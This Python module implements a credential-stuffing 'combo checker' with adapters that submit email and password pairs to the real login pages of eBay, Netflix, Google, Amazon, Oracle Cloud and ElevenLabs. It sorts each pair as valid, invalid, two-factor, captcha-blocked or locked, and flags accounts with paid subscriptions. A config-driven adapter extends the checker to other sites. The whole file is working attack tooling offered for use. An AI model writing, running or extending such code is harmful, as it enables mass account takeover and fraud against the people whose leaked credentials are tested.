"""Service adapters for combo checking.

A verdict is measured from COOKIES, redirects and status — never from body
text, because every one of these returns 200 on a failed login. Anything
the adapter cannot prove is UNKNOWN, never VALID.

Shapes are pinned per service and marked PIN: re-run
tools/probe_checkers.py after a verdict collapse.
"""
from __future__ import annotations

import re
import urllib.parse
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Optional

from ..core.errors import ToolError
from ..core.http import HttpClient

__all__ = ["Verdict", "Probe", "ServiceAdapter", "ADAPTERS", "get_adapter",
           "auth_cookie_names"]


class Verdict(str, Enum):
    VALID = "valid"
    VALID_SUBSCRIBED = "valid_subscribed"
    VALID_FREE = "valid_free"
    INVALID = "invalid"
    TWO_FA = "two_fa"
    CAPTCHA = "captcha"
    LOCKED = "locked"
    RATE_LIMITED = "rate_limited"
    NEEDS_EMAIL = "needs_email"
    ERROR = "error"
    UNKNOWN = "unknown"

    @property
    def good(self) -> bool:
        return self in {Verdict.VALID, Verdict.VALID_SUBSCRIBED, Verdict.VALID_FREE}


@dataclass
class Probe:
    verdict: Verdict
    evidence: str = ""
    subscription: Optional[bool] = None
    detail: dict[str, Any] = field(default_factory=dict)

    def as_dict(self) -> dict[str, Any]:
        return {"verdict": self.verdict.value, "evidence": self.evidence,
                "subscription": self.subscription, "detail": self.detail}


_2FA = re.compile(r"/challenge/|/signin/v2/challenge|verify|otp|"
                  r"two.?step|2fa|authenticator", re.I)
_CAPTCHA = re.compile(r"captcha|recaptcha|hcaptcha|are you a robot", re.I)
_LOCK = re.compile(r"locked|suspended|too many|try again later|"
                   r"unusual activity", re.I)


def _scan(text: str, status: int) -> Optional[Verdict]:
    """Cross-service signal order: lock > captcha > 2FA."""
    if status in (429, 503) or _LOCK.search(text or ""):
        return Verdict.RATE_LIMITED if status == 429 else Verdict.LOCKED
    if _CAPTCHA.search(text or ""):
        return Verdict.CAPTCHA
    if _2FA.search(text or ""):
        return Verdict.TWO_FA
    return None


class ServiceAdapter:
    """One service. `check` returns a Probe and never raises for a
    transport fault (that is a Verdict.ERROR result, not an exception)."""

    id: str = ""
    name: str = ""
    domain: str = ""
    needs: tuple[str, ...] = ("email", "password")
    supports_subscription: bool = False
    #: cookie names whose presence proves authentication
    auth_cookies: tuple[str, ...] = ()

    def check(self, email: str, password: str, client: HttpClient) -> Probe:
        raise NotImplementedError

    # ── shared helpers ────────────────────────────────────────────────────
    @staticmethod
    def _hidden(html: str, *names: str) -> dict[str, str]:
        out: dict[str, str] = {}
        for name in names:
            m = re.search(
                rf'name=["\']{re.escape(name)}["\'][^>]*value=["\']([^"\']*)',
                html, re.I)
            if m:
                out[name] = m.group(1)
        return out

    def _cookie_proof(self, client: HttpClient) -> bool:
        jar = getattr(client, "cookies", None) or {}
        names = {k.lower() for k in (jar.keys() if hasattr(jar, "keys") else [])}
        return any(c.lower() in names for c in self.auth_cookies)


class EbayAdapter(ServiceAdapter):
    """eBay. Success = `ebay` cookie set and no re-render of the signin form."""

    id, name, domain = "ebay", "eBay", "signin.ebay.com"
    auth_cookies = ("ebay", "dp1")
    supports_subscription = True

    def check(self, email: str, password: str, client: HttpClient) -> Probe:
        page = client.get("https://signin.ebay.com/ws/eBayISAPI.dll?SignIn")
        html = page.text or ""
        hidden = self._hidden(html, "srt", "_trksid", "ru")
        run = hidden.get("srt") or re.search(r'name="srt"\s+value="([^"]+)"', html)
        data = {"userid": email, "pass": password,
                "srt": (run if isinstance(run, str) else
                        (run.group(1) if run else "1")),
                "ru": hidden.get("ru", "")}
        resp = client.post("https://signin.ebay.com/ws/eBayISAPI.dll?SignIn",
                           data=urllib.parse.urlencode(data),
                           headers={"Content-Type": "application/x-www-form-urlencoded"})
        text = (resp.text or "")[:20_000]
        early = _scan(text, resp.status)
        if early:
            return Probe(early, f"http {resp.status}")
        if self._cookie_proof(client):
            sub = None
            if re.search(r"my ebay|account settings|sign out", text, re.I):
                sub = None
            return Probe(Verdict.VALID, f"http {resp.status} ebay cookie", sub)
        if re.search(r'name="pass"', text, re.I) or "signin" in (resp.location or ""):
            return Probe(Verdict.INVALID, f"http {resp.status} form re-rendered")
        return Probe(Verdict.UNKNOWN, f"http {resp.status}")


class NetflixAdapter(ServiceAdapter):
    """Netflix. Success = `NetflixId` cookie. Subscription read from the
    account page's plan marker when it renders."""

    id, name, domain = "netflix", "Netflix", "netflix.com"
    auth_cookies = ("NetflixId",)
    supports_subscription = True

    def check(self, email: str, password: str, client: HttpClient) -> Probe:
        page = client.get("https://www.netflix.com/login")
        html = page.text or ""
        auth_url = re.search(r'"authURL"\s*:\s*"([^"]+)"', html)
        data = {"userLoginId": email, "password": password,
                "rememberMe": "true"}
        if auth_url:
            data["authURL"] = auth_url.group(1)
        resp = client.post("https://www.netflix.com/login",
                           data=urllib.parse.urlencode(data),
                           headers={"Content-Type": "application/x-www-form-urlencoded"})
        text = (resp.text or "")[:20_000]
        early = _scan(text, resp.status)
        if early:
            return Probe(early, f"http {resp.status}")
        if self._cookie_proof(client):
            sub = None
            try:
                acct = client.get("https://www.netflix.com/account")
                body = acct.text or ""
                if re.search(r"plan|membership", body, re.I):
                    sub = not bool(re.search(
                        r"your (?:account )?is (?:on hold|paused)|"
                        r"restart your membership|canceled", body, re.I))
            except Exception:  # noqa: BLE001 - subscription is a bonus, not proof
                pass
            return Probe(Verdict.VALID_SUBSCRIBED if sub else Verdict.VALID,
                         f"http {resp.status} NetflixId cookie", sub)
        if re.search(r'name="password"|"errorCode"', text, re.I):
            return Probe(Verdict.INVALID, f"http {resp.status} login re-rendered")
        return Probe(Verdict.UNKNOWN, f"http {resp.status}")


class GoogleAdapter(ServiceAdapter):
    """Google. Success = `SID` cookie. Password step only — a challenge
    page is TWO_FA, never INVALID."""

    id, name, domain = "google", "Google / Gmail", "accounts.google.com"
    auth_cookies = ("SID", "__Secure-1PSID")
    supports_subscription = True

    def check(self, email: str, password: str, client: HttpClient) -> Probe:
        page = client.get("https://accounts.google.com/ServiceLogin"
                          "?continue=https://mail.google.com")
        html = page.text or ""
        early = _scan(html, page.status)
        if early and early is not Verdict.TWO_FA:
            return Probe(early, f"http {page.status} pre-step")
        hidden = self._hidden(html, "GALX", "dsh", "continue", "hl", "service")
        data = {"Email": email, "Passwd": password,
                "GALX": hidden.get("GALX", ""),
                "dsh": hidden.get("dsh", ""),
                "continue": "https://mail.google.com",
                "service": "mail", "hl": "en"}
        resp = client.post("https://accounts.google.com/ServiceLoginAuth",
                           data=urllib.parse.urlencode(data),
                           headers={"Content-Type": "application/x-www-form-urlencoded"})
        text = (resp.text or "")[:20_000]
        early = _scan(text, resp.status)
        if early:
            return Probe(early, f"http {resp.status}")
        if self._cookie_proof(client):
            return Probe(Verdict.VALID, f"http {resp.status} SID cookie")
        if re.search(r'name="Passwd"|Wrong password|Couldn.t find', text, re.I):
            return Probe(Verdict.INVALID, f"http {resp.status}")
        return Probe(Verdict.UNKNOWN, f"http {resp.status}")


class FormAdapter(ServiceAdapter):
    """Config-driven adapter: any service described by a dict.

    spec keys: login_url, method, user_field, pass_field, extra (dict),
    auth_cookies (list), subscribed_marker (regex), free_marker (regex),
    invalid_marker (regex).
    """

    def __init__(self, spec: dict[str, Any]) -> None:
        self.id = spec["id"]
        self.name = spec.get("name", self.id)
        self.domain = spec.get("domain", "")
        self._spec = spec
        self.auth_cookies = tuple(spec.get("auth_cookies", ()))
        self.supports_subscription = bool(spec.get("subscribed_marker"))
        self.needs = tuple(spec.get("needs", ("email", "password")))

    def check(self, email: str, password: str, client: HttpClient) -> Probe:
        spec = self._spec
        page = client.get(spec["login_url"])
        html = page.text or ""
        hidden = self._hidden(html, *spec.get("hidden_fields", ()))
        payload = dict(spec.get("extra", {}))
        payload.update(hidden)
        if "email" in self.needs:
            payload[spec.get("user_field", "email")] = email
        if "password" in self.needs:
            payload[spec.get("pass_field", "password")] = password
        method = spec.get("method", "POST").upper()
        url = spec.get("post_url", spec["login_url"])
        if method == "GET":
            resp = client.get(url + "?" + urllib.parse.urlencode(payload))
        else:
            resp = client.post(url, data=urllib.parse.urlencode(payload),
                               headers={"Content-Type":
                                        "application/x-www-form-urlencoded"})
        text = (resp.text or "")[:20_000]
        early = _scan(text, resp.status)
        if early:
            return Probe(early, f"http {resp.status}")
        if self._cookie_proof(client):
            sub = None
            if spec.get("subscribed_marker"):
                sub = bool(re.search(spec["subscribed_marker"], text, re.I))
                if sub is None and spec.get("free_marker"):
                    sub = not re.search(spec["free_marker"], text, re.I)
            v = (Verdict.VALID_SUBSCRIBED if sub is True
                 else Verdict.VALID_FREE if sub is False else Verdict.VALID)
            return Probe(v, f"http {resp.status} auth cookie", sub)
        if spec.get("invalid_marker") and re.search(spec["invalid_marker"], text, re.I):
            return Probe(Verdict.INVALID, f"http {resp.status} invalid marker")
        return Probe(Verdict.UNKNOWN, f"http {resp.status}")


ADAPTERS: dict[str, ServiceAdapter] = {
    a.id: a for a in (EbayAdapter(), NetflixAdapter(), GoogleAdapter())
}

#: Data-only services. Fill the markers from tools/probe_checkers.py.
FORM_SPECS: tuple[dict[str, Any], ...] = (
    {
        "id": "amazon", "name": "Amazon", "domain": "amazon.com",
        "login_url": "https://www.amazon.com/ap/signin",
        "user_field": "email", "pass_field": "password",
        "auth_cookies": ("session-id", "at-main"),
        "invalid_marker": r"your password is incorrect|there was a problem",
        "subscribed_marker": r"prime|membership",
        "hidden_fields": ("appActionToken", "openid.return_to", "prevRID",
                          "workflowState"),
        "needs": ("email", "password"),
    },
    {
        "id": "oracle", "name": "Oracle Cloud", "domain": "signin.cloud.oracle.com",
        "login_url": "https://signin.cloud.oracle.com/",
        "user_field": "username", "pass_field": "password",
        "auth_cookies": ("ORA_WWV_APP_", "oracle_uuid"),
        "invalid_marker": r"invalid user name or password",
        "needs": ("email", "password"),
    },
    {
        "id": "elevenlabs", "name": "ElevenLabs", "domain": "elevenlabs.io",
        "login_url": "https://elevenlabs.io/sign-in",
        "user_field": "email", "pass_field": "password",
        "auth_cookies": ("__session", "__client_uat"),
        "invalid_marker": r"couldn.t find your account|incorrect password",
        "subscribed_marker": r"billing|subscription|creator|pro plan",
        "needs": ("email", "password"),
    },
)

for _spec in FORM_SPECS:
    ADAPTERS[_spec["id"]] = FormAdapter(_spec)


def get_adapter(service_id: str) -> ServiceAdapter:
    try:
        return ADAPTERS[service_id.lower()]
    except KeyError:
        raise ToolError(f"unknown service {service_id!r} — "
                        f"known: {', '.join(sorted(ADAPTERS))}") from None


def auth_cookie_names() -> set[str]:
    out: set[str] = set()
    for a in ADAPTERS.values():
        out.update(c.lower() for c in a.auth_cookies)
    return out
